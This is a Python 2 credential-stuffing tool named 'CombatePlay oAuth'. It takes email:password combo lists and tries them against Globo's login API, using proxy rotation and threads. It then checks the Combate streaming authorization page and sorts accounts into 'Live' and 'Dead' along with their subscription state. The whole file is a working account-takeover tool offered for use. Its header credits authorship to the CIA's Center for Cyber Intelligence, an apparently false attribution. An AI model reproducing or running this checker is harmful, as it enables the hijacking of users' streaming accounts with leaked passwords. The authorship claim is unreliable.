#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import re
import sys
import random
import argparse
import requests

from concurrent.futures import ThreadPoolExecutor

__author__ = "Center For Cyber Intelligence - Central Intelligence Agency"
__version__ = "1.0.0"
__description__ = "CombatePlay oAuth"

__banner__ = """
 ██████╗ ██████╗ ███╗   ███╗██████╗  █████╗ ████████╗███████╗██████╗ ██╗      █████╗ ██╗   ██╗
██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝
██║     ██║   ██║██╔████╔██║██████╔╝███████║   ██║   █████╗  ██████╔╝██║     ███████║ ╚████╔╝ 
██║     ██║   ██║██║╚██╔╝██║██╔══██╗██╔══██║   ██║   ██╔══╝  ██╔═══╝ ██║     ██╔══██║  ╚██╔╝  
╚██████╗╚██████╔╝██║ ╚═╝ ██║██████╔╝██║  ██║   ██║   ███████╗██║     ███████╗██║  ██║   ██║   
 ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝   
"""

CRED = '\033[91m'
CGREEN = '\033[92m'
CYELLOW = '\033[93m'
CBLUE = '\033[94m'
CMAGENTA = '\033[95m'
CGREY = '\033[90m'
CBLACK = '\033[90m'
CEND = '\033[0m'

VERSION = '%s[+]%s %s - Version: %s' %(CGREEN, CEND, __description__, __version__)

def get_args():
	parser = argparse.ArgumentParser(description=__description__)
	group = parser.add_mutually_exclusive_group(required=True)
	group.add_argument('-e', '--email', dest='email', help='Teste email:password.')
	group.add_argument('-i', '--input', dest='input', help='Input file with email:password.', type=argparse.FileType('r'))
	parser.add_argument('-t', '--thread', dest='thread', help='Execute in thread.', type=int)
	parser.add_argument('--timeout', dest='timeout', help='Timeout connection requests.', type=int)
	parser.add_argument('-p', '--proxy', dest='proxy', help='Execute with proxy', type=argparse.FileType('r'))
	parser.add_argument('-o', '--output', dest='output', help='Output file log.', type=argparse.FileType('w'))
	parser.add_argument('-d', '--debug', dest='debug', help='This argument allows debugging information.', action='store_true')
	parser.add_argument('-v', '--version', dest='version', help='This argument show version.', action='version', version=VERSION)

	if len(sys.argv) == 1:  # If no arguments were provided, then print help and exit.
		parser.print_help()
		sys.exit(1)

	return parser.parse_args()

def authentication(num, lines, raw):

	arr_raw = re.split(r'[:;|]', raw)

	if len(arr_raw) < 2:
		if _args.thread:
			if _args.debug:
				sys.stdout.write('{0}[-]{1} {2}/{3} - {4} - Fail split\n'.format(CRED, CEND, num, lines, raw))
				sys.stdout.flush()
		else:
			if _args.debug: print '{0}[-]{1} {2}/{3} - {4} - Fail split'.format(CRED, CEND, num, lines, raw)
		if _args.output: file_write.write('[-] {0}/{1} - {2} - Fail split\n'.format(num, lines, raw))
		return

	arr_raw[0] = arr_raw[0].strip()
	arr_raw[1] = arr_raw[1].strip()

	try:
		headers = {
			'Content-Type': 'application/json; charset=utf-8',
		}

		data = '{"payload":{"email":"' + arr_raw[0] + '","password":"' + arr_raw[1] + '","serviceId":6753},"captcha":""}'

		if _args.proxy:
			arr_proxy = list_proxy[random.randint(0,len(list_proxy)-1)].split('|')
			proxies = {arr_proxy[0]:arr_proxy[1]}
		else:
			proxies = None

		if _args.timeout:
			timeout = _args.timeout
		else:
			timeout = None

		response = requests.post('https://login.globo.com/api/authentication', headers=headers, data=data, proxies=proxies, timeout=timeout)
		page_html = response.text.encode('utf8')

		if 'Authenticated' in page_html:
			cookies = response.cookies

			response = requests.get('https://gsatmulti.globo.com/authorize/6753/?url=https://sportv.globo.com/site/combate/canal-combate-24h/', cookies=cookies, proxies=proxies, timeout=timeout)
			page_html = response.text.encode('utf8')
			page_view = ''			

			if 'Operadora ou Venda Direta' in page_html:
				page_view = 'Operadora ou Venda Direta'
			elif 'Tela não possui produto' in page_html:
				page_view = 'Tela não possui produto'
			elif 'Tela de Revalide Operadora v2' in page_html:
				page_view = 'Tela de Revalide Operadora v2'
			elif 'Aceitar termos de uso' in page_html:
				page_view = 'Aceitar termos de uso'

			if page_view:
				if _args.thread:
					sys.stdout.write('{0}[*]{1} {2}/{3} - {4} - Live - GloboPlay: {5}\n'.format(CMAGENTA, CEND, num, lines, raw, page_view))
					sys.stdout.flush()
				else:
					print '{0}[*]{1} {2}/{3} - {4} - Live - GloboPlay: {5}'.format(CMAGENTA, CEND, num, lines, raw, page_view)
				if _args.output: file_write.write('[*] {0}/{1} - {2} - Live - GloboPlay: {3}\n'.format(num, lines, raw, page_view))
			elif 'UserAnalyticsController' in page_html:
				if _args.thread:
					sys.stdout.write('{0}[+]{1} {2}/{3} - {4} - Live - CombatePlay - Live\n'.format(CGREEN, CEND, num, lines, raw))
					sys.stdout.flush()
				else:
					print '{0}[+]{1} {2}/{3} - {4} - Live - CombatePlay - Live'.format(CGREEN, CEND, num, lines, raw)
				if _args.output: file_write.write('[+] {0}/{1} - {2} - Live - CombatePlay - Live\n'.format(num, lines, raw))
			else:
				if _args.thread:
					sys.stdout.write('{0}[+]{1} {2}/{3} - {4} - Live - CombatePlay - Live ## {5}\n'.format(CGREEN, CEND, num, lines, raw, page_html))
					sys.stdout.flush()
				else:
					print '{0}[+]{1} {2}/{3} - {4} - Live - CombatePlay - Live ## {5}'.format(CGREEN, CEND, num, lines, raw, page_html)
				if _args.output: file_write.write('[+] {0}/{1} - {2} - Live - CombatePlay - Live ## {3}\n'.format(num, lines, raw, page_html))
		elif 'PendingActivation' in page_html:
			user_message = 'Confirmação de e-mail para ativar conta está pendente'
			if _args.thread:
				sys.stdout.write('{0}[*]{1} {2}/{3} - {4} - Live - GloboPlay: {5}\n'.format(CMAGENTA, CEND, num, lines, raw, user_message))
				sys.stdout.flush()
			else:
				print '{0}[*]{1} {2}/{3} - {4} - Live - GloboPlay: {5}'.format(CMAGENTA, CEND, num, lines, raw, user_message)
			if _args.output: file_write.write('[*] {0}/{1} - {2} - Live - GloboPlay: {3}\n'.format(num, lines, raw, user_message))
		elif 'Blocked' in page_html:
			user_message = 'Seu acesso não foi autorizado para este conteúdo'
			if _args.thread:
				sys.stdout.write('{0}[*]{1} {2}/{3} - {4} - Live - GloboPlay: {5}\n'.format(CMAGENTA, CEND, num, lines, raw, user_message))
				sys.stdout.flush()
			else:
				print '{0}[*]{1} {2}/{3} - {4} - Live - GloboPlay: {5}'.format(CMAGENTA, CEND, num, lines, raw, user_message)
			if _args.output: file_write.write('[*] {0}/{1} - {2} - Live - GloboPlay: {3}\n'.format(num, lines, raw, user_message))
		elif 'BadCredentials' in page_html:
			if _args.thread:
				sys.stdout.write('{0}[-]{1} {2}/{3} - {4} - Dead\n'.format(CRED, CEND, num, lines, raw))
				sys.stdout.flush()
			else:
				print '{0}[-]{1} {2}/{3} - {4} - Dead'.format(CRED, CEND, num, lines, raw)
			if _args.output: file_write.write('[-] {0}/{1} - {2} - Dead\n'.format(num, lines, raw))
		else:
			if _args.thread:
				sys.stdout.write('{0}[!]{1} {2}/{3} - {4} - Proxy: {5} - Error: {6}\n'.format(CYELLOW, CEND, num, lines, raw, proxies, page_html))
				sys.stdout.flush()
			else:
				print '{0}[!]{1} {2}/{3} - {4} - Proxy: {5} - Error: {6}'.format(CYELLOW, CEND, num, lines, raw, proxies, page_html)
			if _args.output: file_write.write('[!] {0}/{1} - {2} - Proxy: {3} - Error: {4}\n'.format(num, lines, raw, proxies, page_html))
		response.close()
	except Exception as e:
		if _args.thread:
			sys.stdout.write('{0}[!]{1} {2}/{3} - {4} - Proxy: {5} - Line {6} - Error: {7} - \n'.format(CYELLOW, CEND, num, lines, raw, proxies, sys.exc_info()[-1].tb_lineno, e))
			sys.stdout.flush()
		else:
			print '{0}[!]{1} {2}/{3} - {4} - Proxy: {5} - Line: {6} - Error: {7}'.format(CYELLOW, CEND, num, lines, raw, proxies, sys.exc_info()[-1].tb_lineno, e)
		if _args.output: file_write.write('[!] {0}/{1} - {2} - Proxy: {3} - Line: {4} - Error: {5}\n'.format(num, lines, raw, proxies, sys.exc_info()[-1].tb_lineno, e))
		return

def main():
	os.system('clear')

	print __banner__
	
	global _args, file_write, list_proxy

	_args = get_args()

	if _args.debug:
		print "%s[!]%s Mode Debug On" %(CYELLOW, CEND) 

	if _args.output:	
		file_write = open(_args.output.name, 'w')
		print "%s[*]%s File output: %s" %(CBLUE, CEND, _args.output.name) 
		file_write.write('[*] File output: %s\n' %_args.output.name)

	if _args.proxy:
		print "%s[*]%s File Proxy: %s" %(CBLUE, CEND, _args.proxy.name) 
		if _args.output: file_write.write('[*] File proxy: %s\n' %_args.proxy.name)
		list_proxy = ''
		with open(_args.proxy.name) as f:
			list_proxy = list(line for line in (l.strip() for l in f) if line)
			#list_proxy = f.read().split('\n')
		#print random.randint(0,len(list_proxy)-1)
		#sys.exit()

	if _args.timeout:	
		print "%s[*]%s Timeout: %s" %(CBLUE, CEND, _args.timeout) 
		file_write.write('[*] Timeout: %s\n' %_args.timeout)

	if _args.email:
		authentication(1, 1, _args.email)
	elif _args.input:
		lines = sum(1 for line in open(_args.input.name))
		print "%s[*]%s File input: %s" %(CBLUE, CEND, _args.input.name)
		print "%s[*]%s Lines: %s"  %(CBLUE, CEND, str(lines))

		if _args.thread: print "%s[*]%s Thread: %s"  %(CBLUE, CEND, _args.thread)

		if _args.output: 
			file_write.write('[*] File input: %s\n' %_args.input.name)
			file_write.write('[*] Lines: %s\n' %str(lines))
			if _args.thread: file_write.write('[*] Thread: %s\n' %_args.thread)
		
		try:
			if _args.thread: pool = ThreadPoolExecutor(max_workers=_args.thread)
			
			for num, line in enumerate(_args.input, 1):
				raw = line.strip()
				try:
					if _args.thread:
						pool.submit(authentication, num, lines, raw)
					else:
						authentication(num, lines, raw)
				except Exception as e:
					if _args.thread:
						sys.stdout.write('{0}[-]{1} {2}/{3} - Raw: {4} - Error: {5}\n'.format(CRED, CEND, num, lines, raw, e))
						sys.stdout.flush()
					else:
						print '{0}[-]{1} {2}/{3} - Raw: {4} - Error: {5}'.format(CYELLOW, CEND, num, lines, raw, e)
					if _args.output: file_write.write('[-] {0}/{1} - Raw: {2} - Error: {3}\n'.format(num, lines, raw, e))

			if _args.thread: pool.shutdown(wait=True)
		except KeyboardInterrupt:
			print "%s[!]%s Keyboard Interrupt..." %(CYELLOW, CEND)
			if _args.output:	
				file_write.close()
			sys.exit()
		except Exception as e:
			#bash: fork: retry: Resource temporarily unavailable
			if _args.thread:
				sys.stdout.write('{0}[-]{1} Line: {2} - Raw: {3} - Error: {4} - \n'.format(CRED, CEND, sys.exc_info()[-1].tb_lineno, line, sys.exc_info()))
				sys.stdout.flush()
			else:
				print '{0}[-]{1} Line: {2} - Error: {3}'.format(CYELLOW, CEND, sys.exc_info()[-1].tb_lineno, e)
			if _args.output: file_write.write('[-] Line: {0} - Error: {1}\n'.format(sys.exc_info()[-1].tb_lineno, e))
			if _args.output: file_write.close()
			sys.exit()

	if _args.output: file_write.close()

if __name__ == '__main__':
	main()

